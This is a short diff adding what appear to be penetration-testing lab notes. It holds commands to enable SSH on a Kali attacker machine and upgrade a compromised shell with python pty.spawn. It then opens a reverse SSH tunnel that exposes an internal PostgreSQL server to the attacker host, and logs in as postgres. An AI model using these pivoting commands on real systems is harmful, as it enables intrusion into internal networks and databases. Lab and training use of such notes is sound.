@@ -1,0 +1,10 @@
+
+
+
+# Kali:
+# PasswordAuthentication yes @ /etc/ssh/sshd_config
+sudo systemctl start ssh
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+psql -h 127.0.0.1 -p 2345 -U postgres
